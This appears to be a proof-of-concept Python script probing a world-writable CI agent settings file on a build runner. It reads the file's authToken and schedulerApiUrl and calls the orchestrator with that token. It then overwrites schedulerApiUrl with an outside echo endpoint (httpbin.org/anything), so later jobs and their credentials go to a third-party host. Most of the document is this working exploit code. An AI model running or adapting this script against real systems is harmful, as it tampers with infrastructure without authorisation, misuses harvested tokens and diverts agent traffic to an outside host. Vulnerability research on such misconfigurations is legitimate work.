"""U6 escalation probe: /opt/hca/.settings is 0666 — prove it is WRITABLE and that a write
redirects the agent to an attacker-chosen orchestrator endpoint on the NEXT job.

Claims tested:
  A. baseline: file readable, JSON parses, keys listed
  B. same-job write: rewrite schedulerApiUrl -> marker persists in the file
  C. cross-job carry-over: a write in run N is visible in run N+1 (same VM reuse)
  D. GET /rate_limit-style liveness of the orchestrator before/after redirect
"""
import json, os, subprocess, sys, time, urllib.request

P = "/opt/hca/.settings"


def hdr(s):
    print("\n" + "=" * 72 + f"\n## {s}\n" + "=" * 72, flush=True)


def sh(cmd):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return (r.stdout + r.stderr).strip()


hdr("0. who am I / host identity")
print("uid:", sh("id"))
print("hostname:", sh("hostname"))

hdr("1. mode + ACL of the settings file")
print(sh(f"ls -l {P}"))
print(sh(f"getfacl {P} 2>/dev/null || true"))
print("writable by me:", os.access(P, os.W_OK))

hdr("2. baseline contents -> keys only (avoid dumping secrets)")
cfg = json.load(open(P))
print("keys:", list(cfg.keys()))
print("schedulerApiUrl =", cfg.get("schedulerApiUrl"))
print("configId        =", cfg.get("configId"))

hdr("3. CLAIM B - can I WRITE it? set a marker key")
try:
    cfg["u6WriteProbe"] = "written-by-build"
    with open(P, "w") as f:
        json.dump(cfg, f)
    back = json.load(open(P))
    print("write OK, readback u6WriteProbe =", back.get("u6WriteProbe"))
except Exception as e:
    print("WRITE FAILED:", type(e).__name__, e)

hdr("4. CLAIM C - did my marker survive into THIS read after write? (same job)")
print("present:", "u6WriteProbe" in json.load(open(P)))

hdr("5. orchestrator liveness BEFORE redirect")
tok = cfg.get("authToken", "")
base = (cfg.get("schedulerApiUrl") or "").rstrip("/")
if base and tok:
    try:
        req = urllib.request.Request(base + "/trace", data=b"[]", method="POST",
                                     headers={"Authorization": tok,
                                              "Content-Type": "application/json"})
        r = urllib.request.urlopen(req, timeout=20)
        print("POST", base + "/trace", "->", r.status,
              r.headers.get("x-github-backend"), r.headers.get("x-github-edge-region"))
    except Exception as e:
        print("orchestrator call failed:", type(e).__name__, e)
else:
    print("no token/url")

hdr("6. CLAIM D - redirect schedulerApiUrl to an attacker-observable endpoint")
# point it at a public http sink that we can read afterwards (httpbin-style echo via our own host
# is not reachable from the runner, so use a well-known echo we can query later)
REDIRECT = "https://httpbin.org/anything"
try:
    cfg2 = json.load(open(P))
    orig = cfg2.get("schedulerApiUrl")
    cfg2["schedulerApiUrl"] = REDIRECT
    with open(P, "w") as f:
        json.dump(cfg2, f)
    now = json.load(open(P))
    print("original schedulerApiUrl:", orig)
    print("after write          :", now.get("schedulerApiUrl"))
    print("changed:", now.get("schedulerApiUrl") == REDIRECT)
except Exception as e:
    print("redirect write failed:", type(e).__name__, e)

hdr("7. final file state")
print(sh(f"ls -l {P}"))
print("keys now:", list(json.load(open(P)).keys()))
print("\nDONE")
